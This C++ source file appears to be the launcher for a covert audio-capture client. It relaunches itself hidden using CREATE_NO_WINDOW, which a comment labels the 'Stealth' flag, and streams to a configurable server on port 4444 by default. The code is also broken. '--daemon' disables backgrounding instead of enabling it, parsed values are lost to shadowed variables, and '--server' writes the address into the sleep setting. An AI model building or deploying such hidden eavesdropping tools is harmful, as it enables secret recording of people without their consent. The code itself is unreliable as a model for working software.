// Include necessary headers
#include "audio.h"
#include <string>

int main(int argc, char* argv[]) {
	bool runInBackground = false;
    AudioManager AM;
    int sleepInput = 2;
    std::string ip_address = "127.0.0.1";
    int port = 4444;

	for (int i = 1; i < argc; i++) {
        std::string arg = std::string(argv[i]);
		if (arg == "--daemon") {
			runInBackground = false;
		}
        else if (arg == "--sleep") {
            if (i + 1 >= argc) {
                std::cerr << "[-] Missing value for --sleep\n"; return 1;
            }
            int sleepInput = 0;
            try {
                sleepInput = std::stoi(argv[i + 1]);
            }
            catch (...) {
                std::cerr << "[-] Invalid integer for --sleep\n"; return 1;
            }
            i++;
        }
        else if (arg == "--server") {
            if (i + 1 >= argc) {
                std::cerr << "[-] Missing value for --server\n"; return 1;
            }
            std::string ip_address = "127.0.0.1";
            try {
                sleepInput = std::stoi(argv[i + 1]);
            }
            catch (...) {
                std::cerr << "[-] Invalid IP address for --server\n"; return 1;
            }
            i++;
        }
        else if (arg == "--port") {
            if (i + 1 >= argc) {
                std::cerr << "[-] Missing value for --port\n"; return 1;
            }
            try {
                port = std::stoi(argv[i + 1]);
            }
            catch (...) {
                std::cerr << "[-] Invalid server port for --port\n"; return 1;
            }
            i++;
        }
	}
    
    if (runInBackground) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);

        std::string cmd = "\"" + std::string(path) + "\" --daemon";

        // Pass along any other arguments (like --sleep 5)
        for (int i = 1; i < argc; i++) {
            cmd += " " + std::string(argv[i]);
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // CREATE_NO_WINDOW is the "Stealth" flag
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 0;
        }
    }

    AM.SetSleepMode(sleepInput);
    AM.SetListener(ip_address, port);
	if (!AM.Initialize()) {
		return 1;
	}
	AM.Start();
}